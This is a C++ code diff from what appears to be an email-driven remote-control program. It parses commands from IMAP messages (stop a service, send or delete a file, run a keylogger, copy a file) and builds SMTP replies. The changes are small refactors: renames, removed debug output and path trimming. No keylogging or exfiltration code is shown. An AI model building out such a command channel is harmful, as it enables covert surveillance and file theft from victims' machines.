@@ -95,17 +95,15 @@ bool receivedNewCommand(imaps& conn, string& title, string& nameObject, string& 
         title == STOP_SERVICE ||
         title == SEND_FILE ||
         title == DELETE_FILE ||
-        title == KEY_LOGGER
+        title == KEYLOGGER
     ) {
 		nameObject = body;
     }
     else if (title == COPY_FILE) {
         stringstream ss(body);
-		getline(ss, source, '\n');
-        cout << source << endl;
-		getline(ss, destination, '\n');
-        cout << destination << endl;
-        system("PAUSE");
+		getline(ss, source, '\n'); // get the first line (source)
+		getline(ss, destination, '\n'); // get the second line (destination)
+        source = source.substr(0, source.size() - 1);
     }
 }
 
@@ -125,7 +123,7 @@ smtps* createSMTPConnection() {
 	exit(EXIT_FAILURE);
 }
 
-void createMsg(message& msg, string subject, string body) {
+void createMessage(message& msg, string subject, string body) {
     msg.from(mail_address(SERVICE_MAIL_NAME, SERVICE_MAIL_ADDRESS));
     msg.add_recipient(mail_address(USER_MAIL_NAME, USER_MAIL_ADDRESS));
     msg.subject(subject);
